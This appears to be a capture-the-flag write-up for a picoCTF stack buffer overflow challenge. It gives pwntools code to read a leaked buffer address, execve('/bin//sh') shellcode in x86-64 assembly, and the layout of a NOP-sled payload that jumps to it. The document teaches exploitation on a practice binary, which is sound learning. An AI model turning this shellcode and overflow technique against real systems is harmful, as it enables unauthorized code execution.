# Shellcode Injection

**Platform:** picoCTF  
**Technique:** Buffer Overflow + Shellcode Injection  
**Difficulty:** Medium  

## Challenge Description

A buffer overflow vulnerability with NX disabled (executable stack). The program leaks the address of our input buffer, allowing us to inject shellcode and jump to it.

## Vulnerability

The program uses an unsafe read into a buffer on the stack. NX is disabled, so we can execute code from the stack. The program also helpfully leaks the buffer address.

## Exploitation

### Step 1: Leak the Buffer Address

```python
leaked_line = p.recvline().strip()
leaked_addr = int(leaked_line, 16)
```
The program sends the address of our input buffer. This is our jump target.

Step 2: Find the Offset
Through fuzzing, I found the return address is at offset 120 bytes from the start of the buffer.

Step 3: Craft the Shellcode
```asm
xor rsi, rsi      ; rsi = 0
push rsi          ; push null terminator
mov rdi, 0x68732f2f6e69622f  ; "/bin//sh"
push rdi          ; push string
mov rdi, rsp      ; rdi = pointer to "/bin//sh"
xor rdx, rdx      ; rdx = 0
xor rax, rax      ; rax = 0
mov al, 0x3b      ; execve syscall number
```
syscall
This shellcode executes /bin/sh.

Step 4: Build the Payload
```python
nop_sled = b"\x90" * 24                    # NOP sled for reliability
shellcode = [27-byte shellcode]
padding = b"A" * (120 - 24 - 27)           # fill to return address
payload = nop_sled + shellcode + padding + p64(leaked_addr)
```
Layout:

24 bytes NOP sled

27 bytes shellcode

69 bytes padding

8 bytes return address (points to buffer start)

Step 5: Get Shell
Send the payload. The program returns to our shellcode, spawning a shell.
